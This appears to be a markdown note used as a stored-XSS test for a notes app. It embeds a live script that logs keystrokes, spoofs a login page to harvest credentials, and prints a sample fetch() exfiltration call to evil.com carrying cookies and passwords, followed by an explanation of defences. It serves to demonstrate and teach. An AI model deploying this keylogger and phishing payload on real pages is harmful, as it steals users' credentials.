# XSS Test 3 — Keylogger & Defacement

This page looks normal. Nothing seems wrong. But a keylogger just started running in the background. Every single keystroke on this page is being recorded.

In a few seconds, this page will transform into something else entirely.

<div id="keystroke-preview" style="display:none;position:fixed;bottom:20px;right:20px;background:#1a1a2e;border:1px solid #ff4444;border-radius:8px;padding:12px 16px;font-family:monospace;font-size:11px;color:#ff6666;z-index:99998;max-width:300px;word-break:break-all;"></div>

<script>
// =============================================
// STAGE 1: Silent keylogger — starts immediately
// =============================================

var capturedKeys = [];
var formData = {};
var stage = 'reading'; // reading → fake_login → hacked

// Her tuş vuruşunu yakala ve kaydet
document.addEventListener('keydown', function(e) {
    var timestamp = new Date().toLocaleTimeString();
    var entry = {
        key: e.key,
        code: e.code,
        time: timestamp,
        stage: stage,
        target: e.target.tagName + (e.target.id ? '#' + e.target.id : '') + (e.target.type ? '[type=' + e.target.type + ']' : '')
    };
    capturedKeys.push(entry);

    // Sağ altta küçük preview göster (demo amaçlı — gerçek saldırıda bu olmaz)
    var preview = document.getElementById('keystroke-preview');
    if (preview) {
        preview.style.display = 'block';
        var recent = capturedKeys.slice(-8).map(function(k) {
            return '<span style="color:#6ea8fe;">' + k.time + '</span> → <span style="color:#7ee787;">' + (k.key.length === 1 ? k.key : '[' + k.key + ']') + '</span>';
        }).join('<br>');
        preview.innerHTML = '<div style="color:#ff4444;font-size:10px;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.1em;">⚠ Keylogger Active</div>' + recent;
    }
});

// =============================================
// STAGE 2: Page spoofing — fake login page
// =============================================

setTimeout(function() {
    stage = 'fake_login';

    // Tüm sayfayı login sayfasının birebir kopyasıyla değiştir
    document.body.innerHTML = '<div class="login-container" style="display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px;background:#0f1117;">' +
        '<div style="background:#161b22;border:1px solid #21262d;border-radius:14px;padding:48px 40px;width:100%;max-width:400px;">' +

            '<div style="text-align:center;margin-bottom:32px;">' +
                '<h1 style="font-family:Georgia,serif;font-size:28px;color:#e6edf3;margin:0 0 8px;">DevToolkit</h1>' +
                '<p style="font-family:monospace;font-size:13px;color:#484f58;margin:0;">Session expired — please sign in again</p>' +
            '</div>' +

            '<div style="background:rgba(255,168,68,0.1);border:1px solid rgba(255,168,68,0.3);border-radius:8px;padding:12px 16px;margin-bottom:20px;text-align:center;">' +
                '<p style="font-family:monospace;font-size:12px;color:#ffa844;margin:0;">⚠ Your session has timed out for security reasons.</p>' +
            '</div>' +

            '<div style="display:flex;flex-direction:column;gap:18px;" id="fake-form">' +
                '<div>' +
                    '<label style="display:block;font-family:monospace;font-size:12px;color:#8b949e;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.06em;">Username</label>' +
                    '<input type="text" id="fake-user" placeholder="admin" autocomplete="off" style="width:100%;padding:12px 14px;background:#0d1117;border:1px solid #21262d;border-radius:8px;font-family:monospace;font-size:14px;color:#e6edf3;outline:none;box-sizing:border-box;">' +
                '</div>' +
                '<div>' +
                    '<label style="display:block;font-family:monospace;font-size:12px;color:#8b949e;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.06em;">Password</label>' +
                    '<input type="password" id="fake-pass" placeholder="••••••" style="width:100%;padding:12px 14px;background:#0d1117;border:1px solid #21262d;border-radius:8px;font-family:monospace;font-size:14px;color:#e6edf3;outline:none;box-sizing:border-box;">' +
                '</div>' +
                '<button id="fake-submit" style="width:100%;padding:12px;background:#238636;color:#fff;border:none;border-radius:8px;font-family:monospace;font-size:14px;font-weight:600;cursor:pointer;margin-top:4px;">Sign In</button>' +
            '</div>' +

            '<div style="text-align:center;margin-top:24px;padding-top:18px;border-top:1px solid #21262d;">' +
                '<p style="font-family:monospace;font-size:12px;color:#484f58;">DevToolkit Security Verification</p>' +
            '</div>' +
        '</div>' +

        '<div id="keystroke-preview-2" style="position:fixed;bottom:20px;right:20px;background:#1a1a2e;border:1px solid #ff4444;border-radius:8px;padding:12px 16px;font-family:monospace;font-size:11px;color:#ff6666;z-index:99998;max-width:300px;word-break:break-all;"></div>' +
    '</div>';

    // URL'i bile değiştir (history API ile — gerçekten sayfa değişmiyor)
    history.pushState(null, 'Login', '/login');

    // Keystroke preview'ı yeni DOM'a bağla
    var preview2 = document.getElementById('keystroke-preview-2');
    document.addEventListener('keydown', function(e) {
        if (preview2) {
            var recent = capturedKeys.slice(-8).map(function(k) {
                return '<span style="color:#6ea8fe;">' + k.time + '</span> → <span style="color:#7ee787;">' + (k.key.length === 1 ? k.key : '[' + k.key + ']') + '</span>';
            }).join('<br>');
            preview2.innerHTML = '<div style="color:#ff4444;font-size:10px;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.1em;">⚠ Keylogger Active</div>' + recent;
        }
    });

    // Submit butonuna tıklanınca HACKED ekranına geç
    document.getElementById('fake-submit').addEventListener('click', function() {
        var username = document.getElementById('fake-user').value;
        var password = document.getElementById('fake-pass').value;

        formData = {
            username: username,
            password: password,
            capturedAt: new Date().toLocaleString()
        };

        stage = 'hacked';
        showHackedScreen();
    });

    // Enter tuşuyla da submit olsun
    document.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' && stage === 'fake_login') {
            document.getElementById('fake-submit').click();
        }
    });

}, 8000); // 8 saniye sonra sahte login'e geç


// =============================================
// STAGE 3: HACKED reveal screen
// =============================================

function showHackedScreen() {
    // URL'i geri düzelt
    history.pushState(null, 'Hacked', '/notes');

    // Keylogger verilerini formatla
    var keystrokeLog = capturedKeys.map(function(k) {
        var stageLabel = k.stage === 'reading' ? 'NOTE PAGE' : 'FAKE LOGIN';
        var stageColor = k.stage === 'reading' ? '#484f58' : '#ff6666';
        var keyDisplay = k.key.length === 1 ? k.key : '[' + k.key + ']';
        return '<div style="display:flex;gap:12px;padding:3px 0;border-bottom:1px solid #161b22;">' +
            '<span style="color:#484f58;min-width:75px;">' + k.time + '</span>' +
            '<span style="color:' + stageColor + ';min-width:90px;font-size:11px;">' + stageLabel + '</span>' +
            '<span style="color:#8b949e;min-width:140px;font-size:11px;">' + k.target + '</span>' +
            '<span style="color:#7ee787;">' + keyDisplay + '</span>' +
        '</div>';
    }).join('');

    // Password'u yıldızlardan çıkar — gerçekte keylogger her tuşu gördü
    var passwordRevealed = '';
    capturedKeys.forEach(function(k) {
        if (k.stage === 'fake_login' && k.target.indexOf('type=password') !== -1 && k.key.length === 1) {
            passwordRevealed += k.key;
        }
    });

    document.body.innerHTML = '<div style="background:#0a0a0a;min-height:100vh;padding:40px 20px;font-family:monospace;">' +
        '<div style="max-width:800px;margin:0 auto;">' +

            // HACKED başlık
            '<div style="text-align:center;padding:40px 0 30px;">' +
                '<h1 style="color:#ff4444;font-size:64px;margin:0;text-shadow:0 0 30px rgba(255,0,0,0.4);">HACKED</h1>' +
                '<p style="color:#666;font-size:16px;margin-top:12px;">This page was taken over by an XSS attack.</p>' +
            '</div>' +

            // Çalınan kimlik bilgileri
            '<div style="background:#1a1a2e;border:2px solid #ff4444;border-radius:10px;padding:24px;margin-bottom:16px;">' +
                '<h3 style="color:#ff4444;margin:0 0 16px;font-size:16px;">STOLEN CREDENTIALS</h3>' +
                '<div style="display:flex;gap:24px;flex-wrap:wrap;">' +
                    '<div><p style="color:#6ea8fe;font-size:11px;margin:0 0 4px;text-transform:uppercase;">Username</p><p style="color:#e6edf3;font-size:16px;margin:0;">' + (formData.username || '(empty)') + '</p></div>' +
                    '<div><p style="color:#6ea8fe;font-size:11px;margin:0 0 4px;text-transform:uppercase;">Password</p><p style="color:#e6edf3;font-size:16px;margin:0;">' + (formData.password || '(empty)') + '</p></div>' +
                    '<div><p style="color:#6ea8fe;font-size:11px;margin:0 0 4px;text-transform:uppercase;">Password (from keylogger)</p><p style="color:#ff6666;font-size:16px;margin:0;">' + (passwordRevealed || '(no keys captured)') + '</p></div>' +
                '</div>' +
                '<p style="color:#484f58;font-size:11px;margin:12px 0 0;">Captured at: ' + (formData.capturedAt || '') + '</p>' +
            '</div>' +

            // Keylogger logu
            '<div style="background:#1a1a2e;border:1px solid #21262d;border-radius:10px;padding:24px;margin-bottom:16px;">' +
                '<h3 style="color:#ff6666;margin:0 0 4px;font-size:14px;">KEYLOGGER LOG — ' + capturedKeys.length + ' keystrokes captured</h3>' +
                '<p style="color:#484f58;font-size:12px;margin:0 0 14px;">Every key pressed on this page since it loaded, including on the fake login form:</p>' +
                '<div style="background:#0d1117;border-radius:6px;padding:14px;max-height:300px;overflow-y:auto;font-size:12px;">' +
                    '<div style="display:flex;gap:12px;padding:0 0 6px;border-bottom:1px solid #21262d;margin-bottom:6px;">' +
                        '<span style="color:#6ea8fe;min-width:75px;font-size:11px;">TIME</span>' +
                        '<span style="color:#6ea8fe;min-width:90px;font-size:11px;">CONTEXT</span>' +
                        '<span style="color:#6ea8fe;min-width:140px;font-size:11px;">TARGET</span>' +
                        '<span style="color:#6ea8fe;font-size:11px;">KEY</span>' +
                    '</div>' +
                    keystrokeLog +
                '</div>' +
            '</div>' +

            // Saldırganın göndereceği veri
            '<div style="background:#1a1a2e;border:1px solid #21262d;border-radius:10px;padding:24px;margin-bottom:16px;">' +
                '<h3 style="color:#ff6666;margin:0 0 12px;font-size:14px;">EXFILTRATION PAYLOAD</h3>' +
                '<p style="color:#484f58;font-size:12px;margin:0 0 10px;">In a real attack, all of this would be sent silently to the attacker\'s server:</p>' +
                '<code style="display:block;background:#0d1117;padding:14px;border-radius:6px;color:#7ee787;font-size:11px;word-break:break-all;white-space:pre-wrap;">fetch("https://evil.com/exfiltrate", {\n  method: "POST",\n  body: JSON.stringify({\n    credentials: ' + JSON.stringify(formData) + ',\n    keystrokes: capturedKeys,  // ' + capturedKeys.length + ' entries\n    cookie: document.cookie,\n    url: location.href\n  })\n})</code>' +
            '</div>' +

            // Detaylı açıklama
            '<div style="background:#161b22;border:1px solid #21262d;border-radius:10px;padding:32px;margin-bottom:16px;font-family:Georgia,serif;line-height:1.8;font-size:15px;color:#c9d1d9;">' +

                '<h2 style="color:#e6edf3;font-size:24px;margin:0 0 20px;font-family:Georgia,serif;">What just happened?</h2>' +

                '<p>Three separate attacks executed in sequence, all from a single <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">&lt;script&gt;</code> block embedded in a markdown note.</p>' +

                '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">Stage 1 — The Keylogger</h3>' +
                '<p>The moment the page loaded, <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">document.addEventListener("keydown", ...)</code> attached a listener to every keystroke on the page. This listener fires before any input field processes the key — it sits at the document level, above everything. Every key pressed anywhere on the page got recorded into an array: the key itself, the timestamp, which element was focused, and which stage of the attack was active. The small red box in the bottom-right corner was showing the captured keys in real time — in a real attack, that preview would not exist. The keylogger would be completely invisible.</p>' +

                '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">Stage 2 — The Page Spoof</h3>' +
                '<p>After 8 seconds, <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">document.body.innerHTML</code> replaced the entire page with a pixel-perfect copy of the login page. The fake page included the same styling, the same layout, the same "DevToolkit" branding — indistinguishable from the real login page. Even the URL in the address bar changed to <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">/login</code> using the History API (<code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">history.pushState</code>). The browser never actually navigated — no HTTP request was made, no page reload happened. It was all just DOM manipulation on the same page. But visually, it was perfect. And the session timeout warning ("Session expired — please sign in again") made the request for credentials feel completely natural.</p>' +

                '<p>Meanwhile, the keylogger from Stage 1 was still running. It was attached to <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">document</code>, not to any specific element. When the innerHTML was replaced, the listener survived because it was bound to the document object itself, not to any DOM node inside the body. So every character typed into the fake username and password fields was captured — including the password, which appeared as dots on screen but was logged as plaintext by the keylogger.</p>' +

                '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">Stage 3 — The Reveal</h3>' +
                '<p>When the "Sign In" button was clicked, the script collected the form values directly (<code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">document.getElementById("fake-user").value</code>) and combined them with the full keylogger log. The page was replaced one final time with this debrief screen. In a real attack, this screen would never appear — the user would simply be redirected to the actual login page, and the stolen credentials would be sent to the attacker\'s server via <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">fetch()</code>. The user would log in normally and never know anything happened.</p>' +

                '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">Why this combination is devastating</h3>' +
                '<p>Each of these techniques is dangerous alone, but together they create something far worse. The keylogger captures everything — not just what the user types into the fake form, but every keystroke on the page from the moment it loads. If the user had typed a search query, navigated with keyboard shortcuts, or entered data in another form before the spoof happened, all of that would be in the log too. The page spoof creates a convincing context for entering sensitive data. The user sees a familiar login page, a plausible "session expired" message, and even the correct URL. And the defacement at the end demonstrates total control over what the user sees.</p>' +

                '<p>The password field is the most telling detail. On screen, the password appeared as dots — the browser\'s built-in masking for <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">type="password"</code> inputs. But the keylogger doesn\'t read the screen. It captures the raw <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">keydown</code> event, which contains the actual character. The dots are just a visual layer — underneath, the keylogger sees everything in plaintext.</p>' +

                '<h3 style="color:#e6edf3;font-size:18px;margin:24px 0 10px;">How this could have been prevented</h3>' +
                '<p>Content-Security-Policy headers with strict <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">script-src</code> directives would block inline scripts from executing entirely. Input sanitization before storing the markdown would strip the script tags before they ever reach the database. Using a whitelist-based HTML sanitizer like <code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">bleach</code> on the output would allow safe HTML tags through while removing dangerous ones. And the History API abuse (<code style="background:rgba(110,168,254,0.1);padding:2px 6px;border-radius:4px;color:#6ea8fe;font-family:monospace;font-size:0.85em;">pushState</code> changing the URL) can be mitigated by verifying the current URL on sensitive pages server-side rather than trusting the client.</p>' +

                '<p style="margin-top:20px;"><a href="javascript:history.back()" style="color:#6ea8fe;text-decoration:none;">← Back to notes</a></p>' +

            '</div>' +
        '</div>' +
    '</div>';
}
</script>

If nothing has happened yet, keep reading. The attack will begin shortly. Try pressing some keys — you might notice something in the bottom-right corner of the screen.
